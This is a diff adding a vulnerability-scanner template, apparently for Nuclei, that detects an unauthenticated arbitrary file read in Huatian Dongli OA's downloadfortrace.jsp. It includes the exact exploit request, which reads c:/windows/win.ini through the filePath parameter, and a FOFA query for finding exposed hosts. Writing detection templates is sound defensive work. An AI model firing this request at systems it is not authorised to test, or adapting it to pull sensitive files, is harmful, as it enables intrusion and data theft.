@@ -1,0 +1,30 @@
+id: huatiandongli-oa-downloadfortrace-fileread
+
+info:
+  name: 华天动力 OA downloadfortrace.jsp 任意文件读取
+  author: avic123
+  severity: high
+  description: |
+    华天动力 OA /OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp 的 filePath 参数可未授权读取 Windows 系统文件。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/OAapp/WebObjects/OAapp.woa"
+  tags: huatian,oa,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: status
+        status:
+          - 200
